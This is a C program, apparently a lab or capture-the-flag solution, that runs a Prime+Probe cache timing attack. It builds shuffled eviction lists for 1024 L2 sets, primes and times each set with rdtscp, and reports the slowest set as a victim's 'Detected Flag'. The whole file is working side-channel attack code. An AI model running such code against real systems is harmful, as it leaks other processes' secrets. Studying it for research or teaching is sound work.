#include "util.h"
#include <sys/mman.h>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define BUFF_SIZE (1<<21)
#define L2_WAYS 16
#ifndef STRIDE
#define STRIDE (1<<16)
#endif

// Inline rdtscp for timing
static inline uint64_t rdtscp(void) {
    uint32_t lo, hi;
    asm volatile("rdtscp" : "=a"(lo), "=d"(hi) :: "rcx");
    return ((uint64_t)hi << 32) | lo;
}

// Linked list node
struct node {
    struct node *next;
    char pad[64 - sizeof(struct node *)]; // Pad to cache line size
};

void *buf;
struct node *sets[1024]; // Pointers to the start of each set's list

// Shuffle an array of pointers
void shuffle(struct node **array, int n) {
    for (int i = n - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        struct node *temp = array[i];
        array[i] = array[j];
        array[j] = temp;
    }
}

// Build shuffled linked list for a set
void build_set(int set_index) {
    char *base = (char *)buf;
    struct node *nodes[L2_WAYS];
    
    for (int i = 0; i < L2_WAYS; i++) {
        nodes[i] = (struct node *)(base + set_index * 64 + i * STRIDE);
    }
    
    shuffle(nodes, L2_WAYS);
    
    for (int i = 0; i < L2_WAYS - 1; i++) {
        nodes[i]->next = nodes[i+1];
    }
    nodes[L2_WAYS-1]->next = NULL;
    
    sets[set_index] = nodes[0];
}

// Prime the current set
void prime_set(int set_index) {
    struct node *curr = sets[set_index];
    while (curr) {
        curr = curr->next;
    }
}

// Probe the current set and return the access time
uint64_t probe_set(int set_index) {
    uint64_t start = rdtscp();
    struct node *curr = sets[set_index];
    while (curr) {
        curr = curr->next;
    }
    uint64_t end = rdtscp();
    return end - start;
}

// Structure to store results for sorting
typedef struct {
    int set_index;
    uint64_t median_latency;
} Result;

int compare_results(const void *a, const void *b) {
    Result *r1 = (Result *)a;
    Result *r2 = (Result *)b;
    // Sort descending by latency
    if (r2->median_latency > r1->median_latency) return 1;
    if (r2->median_latency < r1->median_latency) return -1;
    return 0;
}

// Helper to find median of an array
uint64_t find_median(uint64_t *arr, int n) {
    // Simple bubble sort for small n
    for (int i = 0; i < n-1; i++) {
        for (int j = 0; j < n-i-1; j++) {
            if (arr[j] > arr[j+1]) {
                uint64_t temp = arr[j];
                arr[j] = arr[j+1];
                arr[j+1] = temp;
            }
        }
    }
    return arr[n/2];
}

int main(int argc, char const *argv[]) {
    srand(time(NULL));

    // Allocate huge page
    buf = mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
    
    if (buf == (void*) - 1) {
        perror("mmap() error\n");
        exit(EXIT_FAILURE);
    }
    
    *((char *)buf) = 1; // dummy write

    printf("Building sets...\n");
    for (int i = 0; i < 1024; i++) {
        build_set(i);
    }

    printf("Scanning L2 sets (using median filtering)...\n");

    // Store measurements for all sets across all passes
    // 1024 sets, 5 passes
    #define PASSES 5
    uint64_t measurements[1024][PASSES];

    int samples = 1000; // High sample count for stability

    for (int p = 0; p < PASSES; p++) {
        printf("Pass %d/%d...\n", p+1, PASSES);
        for (int i = 0; i < 1024; i++) {
            uint64_t total_latency = 0;
            
            for (int k = 0; k < samples; k++) {
                prime_set(i);
                // Wait a bit for victim to access
                for(volatile int w=0; w<1000; w++);
                total_latency += probe_set(i);
            }
            
            measurements[i][p] = total_latency / samples;
        }
    }

    // Calculate medians
    Result results[1024];
    for (int i = 0; i < 1024; i++) {
        results[i].set_index = i;
        results[i].median_latency = find_median(measurements[i], PASSES);
    }

    // Sort results
    qsort(results, 1024, sizeof(Result), compare_results);

    printf("\nTop 5 High Latency Sets (Median over %d passes):\n", PASSES);
    for (int i = 0; i < 5; i++) {
        printf("Set %d: %llu cycles\n", results[i].set_index, (unsigned long long)results[i].median_latency);
    }

    printf("\nDetected Flag: %d\n", results[0].set_index);
    
    return 0;
}
